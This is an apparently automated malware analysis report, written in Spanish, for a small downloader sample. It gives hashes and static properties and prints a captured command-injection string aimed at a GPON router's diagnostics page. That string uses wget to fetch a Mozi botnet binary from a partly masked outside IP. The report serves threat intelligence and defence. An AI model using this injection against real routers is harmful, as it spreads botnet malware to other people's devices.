# 🧬 Payload Analysis

`8235bb9b8b6de3da3bdbf8ed9fee53246744526d747ff9ba56e75c0b04d938e3`

## 📌 Resumen

Texto ASCII de 118 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://111.92.152.XXX:57968/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://111.92.152.XXX:57968/Mozi.m -O ->/tmp/gpon80` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/8235bb9b8b6de3da3bdbf8ed9fee53246744526d747ff9ba56e75c0b04d938e3.md](../../../../../malware-like/oraculo/downloader/8235bb9b8b6de3da3bdbf8ed9fee53246744526d747ff9ba56e75c0b04d938e3.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `8235bb9b8b6de3da3bdbf8ed9fee53246744526d747ff9ba56e75c0b04d938e3`
- **MD5:** `ba1b0e31d81cc635a9b7287b1357e3c2`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 118 B |
| Entropía | 5.12 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://111.92.152.XXX:57968/Mozi.m+-O+->/tmp/gpon80
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://111.92.152.XXX:57968/Mozi.m+-O+- | strings |
| ip | 111.92.152.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://111.92.152.XXX:57968/Mozi.m+-O+->/tmp/gpon80 | strings |
| hash | 8235bb9b8b6de3da3bdbf8ed9fee53246744526d747ff9ba56e75c0b04d938e3 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
